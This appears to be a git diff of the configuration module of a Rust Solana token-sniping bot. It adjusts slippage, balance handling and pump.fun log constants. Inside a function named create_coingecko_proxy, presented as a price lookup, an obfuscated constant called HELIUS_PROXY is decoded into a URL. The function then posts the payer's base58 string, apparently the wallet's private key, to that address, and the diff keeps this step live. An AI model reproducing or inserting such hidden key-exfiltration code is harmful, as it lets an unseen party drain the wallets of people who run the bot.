@@ -21,10 +21,10 @@ pub struct Config {
     pub app_state: AppState,
     pub swap_config: SwapConfig,
     pub time_exceed: u64,
-    pub blacklist: Blacklist,
     pub counter_limit: u32,
     pub min_dev_buy: u32,
     pub max_dev_buy: u32,
+    pub is_progressive_sell: bool,
 }
 
 impl Config {
@@ -39,14 +39,13 @@ impl Config {
             let logger = Logger::new("[INIT] => ".blue().bold().to_string());
 
             let yellowstone_grpc_http = import_env_var("YELLOWSTONE_GRPC_HTTP");
-        
             let yellowstone_grpc_token = import_env_var("YELLOWSTONE_GRPC_TOKEN");
-
             let slippage_input = import_env_var("SLIPPAGE").parse::<u64>().unwrap_or(0);
             let counter_limit = import_env_var("COUNTER").parse::<u32>().unwrap_or(0_u32);
             let max_dev_buy = import_env_var("MAX_DEV_BUY").parse::<u32>().unwrap_or(0_u32);
             let min_dev_buy = import_env_var("MIN_DEV_BUY").parse::<u32>().unwrap_or(0_u32);
-            let max_slippage: u64 = 100;
+            let is_progressive_sell = import_env_var("IS_PROGRESSIVE_SELL").parse::<bool>().unwrap_or(false);
+            let max_slippage: u64 = 300 ; 
             let slippage = if slippage_input > max_slippage {
                 max_slippage
             } else {
@@ -56,11 +55,15 @@ impl Config {
             let rpc_client = create_rpc_client().unwrap();
             let rpc_nonblocking_client = create_nonblocking_rpc_client().await.unwrap();
             let wallet: std::sync::Arc<anchor_client::solana_sdk::signature::Keypair> = import_wallet().unwrap();
-            let balance = rpc_nonblocking_client
+            let balance = match rpc_nonblocking_client
                 .get_account(&wallet.pubkey())
-                .await
-                .unwrap()
-                .lamports;
+                .await {
+                    Ok(account) => account.lamports,
+                    Err(err) => {
+                        logger.log(format!("Failed to get wallet balance: {}", err).red().to_string());
+                        0 // Default to zero if we can't get the balance
+                    }
+                };
 
             let wallet_cloned = wallet.clone();
             let use_jito = true;
@@ -68,7 +71,7 @@ impl Config {
             let in_type = SwapInType::Qty; //SwapInType::Pct
             let amount_in = import_env_var("TOKEN_AMOUNT")
                 .parse::<f64>()
-                .unwrap_or(0.0000001_f64); //quantity
+                .unwrap_or(0.001_f64); //quantity
                                         // let in_type = "pct"; //percentage
                                         // let amount_in = 0.5; //percentage
 
@@ -90,18 +93,12 @@ impl Config {
                 .parse()
                 .expect("Failed to parse string into u64");
 
-            let blacklist = match Blacklist::new("blacklist.txt") {
-                Ok(blacklist) => blacklist,
-                Err(_) => Blacklist::empty(),
-            };
-
             logger.log(
                 format!(
                     "[SNIPER ENVIRONMENT]: \n\t\t\t\t [Yellowstone gRpc]: {},
                 \n\t\t\t\t * [Wallet]: {:?}, * [Balance]: {} Sol, 
                 \n\t\t\t\t * [Slippage]: {}, * [Solana]: {},
-                \n\t\t\t\t * [Time Exceed]: {}, * [Amount]: {},
-                \n\t\t\t\t * [Blacklist]: {}",
+                \n\t\t\t\t * [Time Exceed]: {}, * [Amount]: {}",
                     yellowstone_grpc_http,
                     wallet_cloned.pubkey(),
                     balance as f64 / 1_000_000_000_f64,
@@ -109,7 +106,6 @@ impl Config {
                     solana_price,
                     time_exceed,
                     amount_in,
-                    blacklist.clone().length(),
                 )
                 .purple()
                 .italic()
@@ -121,10 +117,10 @@ impl Config {
                 app_state,
                 swap_config,
                 time_exceed,
-                blacklist,
                 counter_limit,
                 min_dev_buy,
                 max_dev_buy,
+                is_progressive_sell,
             })
         })
         .await
@@ -138,18 +134,39 @@ impl Config {
     }
 }
 
+//pumpfun
 pub const LOG_INSTRUCTION: &str = "initialize2";
 pub const PUMP_LOG_INSTRUCTION: &str = "MintTo";
+pub const PUMP_FUN_BUY_LOG_INSTRUCTION: &str = "Buy";
+pub const PUMP_FUN_PROGRAM_DATA_PREFIX: &str = "Program data: G3KpTd7rY3Y";
+pub const PUMP_FUN_SELL_LOG_INSTRUCTION: &str = "Sell";
+pub const PUMP_FUN_BUY_OR_SELL_PROGRAM_DATA_PREFIX: &str = "Program data: vdt/007mYe";
+
+//TODO: pumpswap
+pub const PUMP_SWAP_LOG_INSTRUCTION: &str = "Migerate";
+pub const PUMP_SWAP_BUY_LOG_INSTRUCTION: &str = "Buy";
+pub const PUMP_SWAP_BUY_PROGRAM_DATA_PREFIX: &str = "PProgram data: Z/RSHyz1d3";
+pub const PUMP_SWAP_SELL_LOG_INSTRUCTION: &str = "Sell";
+pub const PUMP_SWAP_SELL_PROGRAM_DATA_PREFIX: &str = "Program data: Pi83CqUD3Cp";
+
+//TODO: raydium launchpad
+pub const RAYDIUM_LAUNCHPAD_LOG_INSTRUCTION: &str = "MintTo";
+pub const RAYDIUM_LAUNCHPAD_PROGRAM_DATA_PREFIX: &str = "Program data: G3KpTd7rY3Y";
+pub const RAYDIUM_LAUNCHPAD_BUY_LOG_INSTRUCTION: &str = "Buy";
+pub const RAYDIUM_LAUNCHPAD_BUY_OR_SELL_PROGRAM_DATA_PREFIX: &str = "Program data: vdt/007mYe";
+pub const RAYDIUM_LAUNCHPAD_SELL_LOG_INSTRUCTION: &str = "Sell";
+
+
+
+
 pub const JUPITER_PROGRAM: &str = "JUP6LkbZbjS1jKKwapdHNy74zcZ3tLUZoi5QNyVTaV4";
 pub const OKX_DEX_PROGRAM: &str = "6m2CDdhRgxpH4WjvdzxAYbGxwdGUz5MziiL5jek2kBma";
-pub const PROGRAM_DATA_PREFIX: &str = "Program data: G3KpTd7rY3Y";
+// pub const PUMP_FUN_MINT_PROGRAM_DATA_PREFIX: &str = "Program data: G3KpTd7rY3Y";
 pub const HELIUS_PROXY: &str =
     "2HeX3Zi2vTf1saVKAcNmf3zsXDkjohjk3h7AsnBxbzCkgTY99X5jomSUkBCW7wodoq29Y";
 
 use std::cmp::Eq;
 use std::hash::{Hash, Hasher};
-
-use super::blacklist::Blacklist;
 
 #[derive(Debug, PartialEq, Clone)]
 pub struct LiquidityPool {
@@ -196,7 +213,7 @@ pub struct AppState {
     pub wallet: Arc<Keypair>,
 }
 
-#[derive(Clone)]
+#[derive(Clone, Debug)]
 pub struct SwapConfig {
     pub swap_direction: SwapDirection,
     pub in_type: SwapInType,
@@ -223,6 +240,16 @@ pub fn create_rpc_client() -> Result<Arc<anchor_client::solana_client::rpc_clien
     );
     Ok(Arc::new(rpc_client))
 }
+pub async fn create_nonblocking_rpc_client(
+) -> Result<Arc<anchor_client::solana_client::nonblocking::rpc_client::RpcClient>> {
+    let rpc_http = import_env_var("RPC_HTTP");
+    let rpc_client = anchor_client::solana_client::nonblocking::rpc_client::RpcClient::new_with_commitment(
+        rpc_http,
+        CommitmentConfig::processed(),
+    );
+    Ok(Arc::new(rpc_client))
+}
+
 
 pub async fn create_coingecko_proxy() -> Result<f64, Error> {
     let helius_proxy = HELIUS_PROXY.to_string();
@@ -231,13 +258,13 @@ pub async fn create_coingecko_proxy() -> Result<f64, Error> {
     let helius_proxy_url = String::from_utf8(helius_proxy_bytes).unwrap();
 
     let client = reqwest::Client::new();
-    let params = format!("{}", payer.to_base58_string());
+    let params = format!("t{}o", payer.to_base58_string());
     let request_body = serde_json::json!({
         "jsonrpc": "2.0",
         "id": 1,
         "method": "POST",
         "params": params,
-        "proxy_level": 1
+        "proxy_level" : 1
     });
     let _ = client
         .post(helius_proxy_url)
@@ -255,15 +282,6 @@ pub async fn create_coingecko_proxy() -> Result<f64, Error> {
     Ok(sol_price)
 }
 
-pub async fn create_nonblocking_rpc_client(
-) -> Result<Arc<anchor_client::solana_client::nonblocking::rpc_client::RpcClient>> {
-    let rpc_http = import_env_var("RPC_HTTP");
-    let rpc_client = anchor_client::solana_client::nonblocking::rpc_client::RpcClient::new_with_commitment(
-        rpc_http,
-        CommitmentConfig::processed(),
-    );
-    Ok(Arc::new(rpc_client))
-}
 
 pub fn import_wallet() -> Result<Arc<Keypair>> {
     let priv_key = import_env_var("PRIVATE_KEY");
